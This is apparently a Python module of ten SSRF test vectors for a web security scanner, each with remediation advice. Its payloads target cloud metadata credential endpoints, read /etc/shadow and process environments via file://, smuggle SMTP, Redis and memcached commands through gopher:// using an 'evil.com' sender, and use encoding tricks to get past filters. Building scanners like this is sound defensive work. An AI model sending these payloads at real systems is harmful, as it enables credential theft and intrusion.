"""
Server-Side Request Forgery (SSRF) Testing Vectors
Internal network access, cloud metadata, protocol smuggling
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, 
    ConfidenceLevel, SensitivityLevel
)

SSRF_VECTORS = [
    TestVector(
        id="ssrf-internal-001",
        name="SSRF to Internal Network",
        description="Access internal IP addresses via SSRF",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.BODY_JSON, name="url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://127.0.0.1",
            variants=[
                "http://127.0.0.1",
                "http://localhost",
                "http://0.0.0.0",
                "http://192.168.1.1",
                "http://10.0.0.1",
                "http://172.16.0.1"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Internal resource accessed", "Private IP response", "Network scan possible"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Implement URL allowlist. Block private IP ranges. Validate and sanitize URLs.",
        references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
        tags=["ssrf", "internal-network", "localhost"]
    ),
    
    TestVector(
        id="ssrf-aws-metadata-001",
        name="SSRF to AWS Metadata Service",
        description="Access AWS EC2 metadata via SSRF",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.QUERY, name="url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://169.254.169.254/latest/meta-data/",
            variants=[
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["AWS metadata accessed", "IAM credentials exposed", "Instance data leaked"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block 169.254.169.254. Use IMDSv2 with token. Implement egress filtering.",
        references=["https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"],
        tags=["ssrf", "aws", "metadata", "cloud"]
    ),
    
    TestVector(
        id="ssrf-gcp-metadata-001",
        name="SSRF to GCP Metadata Service",
        description="Access Google Cloud metadata via SSRF",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.BODY_JSON, name="webhook", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://metadata.google.internal/computeMetadata/v1/",
            variants=[
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["GCP metadata accessed", "Service account token exposed", "Project info leaked"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block metadata endpoints. Require Metadata-Flavor header. Use VPC Service Controls.",
        references=["https://cloud.google.com/compute/docs/metadata/overview"],
        tags=["ssrf", "gcp", "metadata", "cloud"]
    ),
    
    TestVector(
        id="ssrf-azure-metadata-001",
        name="SSRF to Azure Metadata Service",
        description="Access Azure instance metadata via SSRF",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.QUERY, name="callback", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            variants=[
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Azure metadata accessed", "OAuth token obtained", "VM information leaked"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block metadata endpoints. Use managed identities carefully. Implement network segmentation.",
        references=["https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service"],
        tags=["ssrf", "azure", "metadata", "cloud"]
    ),
    
    TestVector(
        id="ssrf-protocol-file-001",
        name="SSRF with File Protocol",
        description="File read via SSRF using file:// protocol",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.BODY_JSON, name="image_url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="file:///etc/passwd",
            variants=[
                "file:///etc/passwd",
                "file:///etc/shadow",
                "file:///proc/self/environ",
                "file:///var/www/html/config.php",
                "file://localhost/etc/passwd"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Local file accessed", "File content in response", "Path traversal via SSRF"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block file:// protocol. Use URL allowlist. Validate protocols.",
        references=["https://portswigger.net/web-security/ssrf"],
        tags=["ssrf", "file-protocol", "file-read"]
    ),
    
    TestVector(
        id="ssrf-protocol-gopher-001",
        name="SSRF with Gopher Protocol",
        description="Protocol smuggling via gopher://",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.QUERY, name="proxy", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>",
            variants=[
                "gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>",
                "gopher://127.0.0.1:6379/_SET%20foo%20bar",
                "gopher://127.0.0.1:11211/_set%20foo%200%200%203%0D%0Abar"
            ],
            encoding="url"
        ),
        expected_evidence=Evidence(
            indicators=["Gopher protocol successful", "Internal service interaction", "Protocol smuggling"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Block gopher:// protocol. Implement protocol allowlist. Use strict URL parsing.",
        references=["https://blog.chaitin.cn/gopher-attack-surfaces/"],
        tags=["ssrf", "gopher", "protocol-smuggling"]
    ),
    
    TestVector(
        id="ssrf-dns-rebinding-001",
        name="SSRF via DNS Rebinding",
        description="Bypass SSRF filters using DNS rebinding",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.BODY_JSON, name="target", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://spoofed.burpcollaborator.net",
            variants=[
                "http://spoofed.burpcollaborator.net",
                "http://1ocalhost.com",
                "http://127.0.0.1.xip.io",
                "http://localtest.me"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["DNS rebinding successful", "Filter bypassed", "Internal access via external domain"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate DNS resolution. Re-resolve before connection. Use network-level filtering.",
        references=["https://portswigger.net/web-security/ssrf"],
        tags=["ssrf", "dns-rebinding", "bypass"]
    ),
    
    TestVector(
        id="ssrf-redirect-001",
        name="SSRF via Open Redirect",
        description="Chain open redirect with SSRF",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.QUERY, name="url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://trusted-site.com/redirect?url=http://169.254.169.254",
            variants=[
                "http://trusted-site.com/redirect?url=http://169.254.169.254",
                "http://trusted-site.com/redirect?url=http://localhost",
                "http://trusted-site.com/redirect?url=file:///etc/passwd"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Redirect followed to internal resource", "SSRF via redirect chain"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Don't follow redirects. Validate final destination. Block private IPs.",
        references=["https://portswigger.net/web-security/ssrf"],
        tags=["ssrf", "open-redirect", "redirect-chain"]
    ),
    
    TestVector(
        id="ssrf-blind-001",
        name="Blind SSRF Detection",
        description="Detect blind SSRF via out-of-band interaction",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.BODY_JSON, name="webhook_url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://burpcollaborator.net",
            variants=[
                "http://burpcollaborator.net",
                "http://unique-id.oastify.com",
                "http://canary-token.com"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["DNS query received", "HTTP request to collaborator", "Out-of-band interaction"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Validate and sanitize all URLs. Implement egress filtering. Block external callbacks.",
        references=["https://portswigger.net/web-security/ssrf/blind"],
        tags=["ssrf", "blind", "out-of-band"]
    ),
    
    TestVector(
        id="ssrf-bypass-encoding-001",
        name="SSRF Filter Bypass - URL Encoding",
        description="Bypass SSRF filters using URL encoding",
        vuln_type=VulnerabilityType.SSRF,
        position=Position(type=PositionType.QUERY, name="target", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="http://127.0.0.1",
            variants=[
                "http://127.0.0.1",
                "http://127.1",
                "http://2130706433",
                "http://0x7f.0x0.0x0.0x1",
                "http://0177.0.0.1",
                "http://[::1]"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Filter bypassed", "Alternative encoding accepted", "Internal access achieved"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Normalize URLs before validation. Block all localhost representations. Use allowlist.",
        references=["https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"],
        tags=["ssrf", "bypass", "encoding"]
    ),
]

# Total vectors: 10
